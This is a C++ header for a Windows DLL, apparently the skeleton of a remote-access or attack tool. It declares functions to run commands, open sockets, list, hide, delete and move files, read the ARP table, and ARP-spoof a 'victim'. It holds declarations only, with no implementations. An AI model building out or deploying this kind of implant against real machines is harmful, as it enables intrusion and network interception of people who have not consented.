#pragma once
#ifndef COMPONENTS_H
#define COMPONENTS_H

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <stdexcept>
#include <iostream>
#include <string>
#include <vector>
#include <algorithm>
#include <fstream>
#include <numeric>
#include <sstream>
#include <iterator>
#include <thread>
#include "MyFileClass.h"
using namespace std;

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")
/*
	Declarations of functions which are in the export table
*/
extern "C" {
#ifdef EXPORTING_DLL
	extern __declspec(dllexport) string RunNetstat(string nothing);
	extern __declspec(dllexport) string GetAllFiles(string dir);
	extern __declspec(dllexport) string OpenSocket(string ip_and_port);
	extern __declspec(dllexport) string ChangeFile(string file);
	extern __declspec(dllexport) string SpoofVictim(std::string ip);
	extern __declspec(dllexport) bool StopSpoofingVictim(std::string ip);
#else
	extern __declspec(dllexport) string RunNetstat(string nothing);
	extern __declspec(dllexport) string GetAllFiles(string dir);
	extern __declspec(dllexport) string OpenSocket(string ip_and_port);
	extern __declspec(dllexport) string ChangeFile(string file);
	extern __declspec(dllexport) string GetArpTable();
	extern __declspec(dllexport) string SpoofVictim(std::string ip);
	extern __declspec(dllexport) bool StopSpoofingVictim(std::string ip);

#endif
}
/*
Declarations of functions which are internal
*/
string exec(string cmd);
string getFilePermissions(perms p);
bool ConnectToHost(const char *PortNo, const char* IPAddress, SOCKET* s);
void CloseConnection(SOCKET s);
void getAllFilesInDir(const string &dirPath, vector<MyFileClass> listOfFiles);
string OpenSocketWithThread(std::string ip_and_port);
string HideFileOrFolder(string file);
string DeleteGivenFile(string file);
string UnHideFileOrFolder(string pathtofileorfolder);
string MoveGivenFileToDestination(string pathtofile, string Destination);
void SpoofVictimInThread(std::string ip);
#endif
